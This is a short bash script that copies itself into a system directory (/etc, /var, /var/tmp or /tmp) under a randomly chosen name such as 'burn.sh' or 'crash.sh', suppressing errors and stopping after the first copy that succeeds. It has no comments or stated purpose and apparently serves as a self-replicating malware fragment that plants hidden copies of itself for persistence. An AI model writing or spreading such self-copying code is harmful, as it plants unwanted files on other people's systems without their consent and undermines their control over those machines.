#!/bin/bash

dirs=("/etc" "/var" "/var/tmp" "/tmp")
names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
rando=${names[RANDOM%4]}


for dir in ${dirs[@]}; do
	cp ${0} "$dir/$rando" 2>/dev/null && break
done
